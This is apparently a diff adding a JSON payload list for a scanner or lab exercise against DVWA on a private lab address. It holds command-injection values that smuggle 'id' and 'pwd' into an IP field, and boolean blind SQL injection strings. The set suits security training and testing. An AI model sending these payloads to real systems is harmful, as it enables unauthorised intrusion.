@@ -1,0 +1,14 @@
+[
+  {
+    "url": "http://192.168.153.200/DVWA/vulnerabilities/exec/",
+    "method": "POST",
+    "param": "ip",
+    "values": ["127.0.0.1 | id", "127.0.0.1; pwd"]
+  },
+  {
+    "url": "http://192.168.153.200/DVWA/vulnerabilities/sqli_blind/?Submit=Submit",
+    "method": "GET",
+    "param": "id",
+    "values": ["1' AND 1=1 -- ", "1' AND 1=2 -- "]
+  }
+]
